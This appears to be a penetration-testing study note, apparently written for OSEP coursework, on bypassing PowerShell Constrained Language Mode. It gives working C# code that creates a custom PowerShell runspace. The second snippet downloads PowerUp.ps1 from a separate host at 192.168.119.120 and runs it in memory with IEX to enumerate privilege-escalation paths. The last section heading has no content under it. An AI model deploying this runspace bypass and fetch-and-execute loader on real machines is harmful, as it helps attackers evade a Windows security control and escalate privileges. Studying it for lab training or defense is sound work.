# Bypassing with PowerShell

## Constrained Language Mode

```powershell
# Find the language mode of the current PowerShell session
$ExecutionContext.SessionState.LanguageMode

```

## Custom Runspaces

Locate at `/home/kali/data/OSEP/CustomRunspace/`

Visual Studio can not locate _System.Management.Automation.Runspaces_, to resolve this. Right-click the References folder in the Solution Explorer and select _Add Reference._ To do this, we'll select the _Browse..._ button at the bottom of the window and navigate to the C:\Windows\assembly\GAC\_MSIL\System.Management.Automation\1.0.0.0\_\_31bf3856ad364e35 folder where we will select System.Management.Automation.dll

{% code overflow="wrap" %}
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CustomRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
{% endcode %}

**Script to fetch and execute PowerUp in a custom runspace**

{% code overflow="wrap" %}
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CustomRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
{% endcode %}

## PowerShell CLM Bypass
